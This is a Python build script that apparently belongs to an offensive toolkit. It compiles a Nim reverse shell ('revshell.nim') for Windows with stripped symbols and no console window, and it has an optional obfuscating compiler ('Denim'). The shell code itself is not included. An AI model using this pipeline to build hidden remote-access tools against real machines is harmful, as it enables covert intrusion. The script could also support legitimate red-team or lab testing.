#!/usr/bin/env python3

import os 
import sys 
import shutil 
import argparse 
import subprocess 
import platform 
from pathlib import Path 

# Nim c
NC_FLAGS = [
    "-d:release", 
    "-d:strip", 
    "-d:noRes",
    "--opt:size",
    "--hints:off", 
    "--warnings:off", 
    "--cpu=amd64",
    "--app:gui"
]

# Denim
# Denim.exe compile -h
DC_FLAGS = [
    "-v"
]

def run(denim=False):
    if platform.system() == "Linux":
        converter_path = Path(__file__).parent / "converter"
        if not converter_path.exists():
            print(">> Compiling converter")
            subprocess.run(["nim", "c", "--hints:off", "--warnings:off", "converter.nim"])
        
        if denim == True:
            print(">> Compiling the revshell with denim")
            subprocess.run(["wine", "denim.exe", "compile"] + DC_FLAGS + ["revshell.nim"])
        else:
            print(">> Compiling the revshell")
            subprocess.run(["nim", "c", "-d:mingw"] + NC_FLAGS + ["revshell.nim"])

    else:
        converter_path = Path(__file__).parent / "converter.exe"
        if not converter_path.exists():
            print(">> Compiling converter")
            subprocess.run(["nim", "c", "--hints:off", "--warnings:off", "converter.nim"])
        
        if denim == True:
            print(">> Compiling the revshell with denim")
            subprocess.run(["denim.exe", "compile"] + DC_FLAGS + ["revshell.nim"])
        else:
            print(">> Compiling the revshell")
            subprocess.run(["nim", "c"] + NC_FLAGS + ["revshell.nim"])

def check_deps(denim=False) -> bool:
    if denim == True:
        denim_path = Path(__file__).parent / "Denim.exe"
        if not denim_path.exists():
            print("[X] Denim.exe not found in script root. Download and setup or edit the script")
            return False
        if platform.system() == "Linux":
            if shutil.which("wine") is None:
                print("[X] Wine not found in path. Install or edit the script")
                return False 
    if shutil.which("nim") is None:
        print("[X] Nim not found in path. Install or edit the script")
        return False 
    return True    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(formatter_class=argparse.HelpFormatter)
    parser.add_argument("-d", "--denim", required=False, action="store_true",help=("(Testing) Use Denim for compiling"))
    args = parser.parse_args()

    if check_deps(args.denim) == False:
        sys.exit()

    if args.denim == True:
        run(denim=True)
    else:
        run(denim=False)
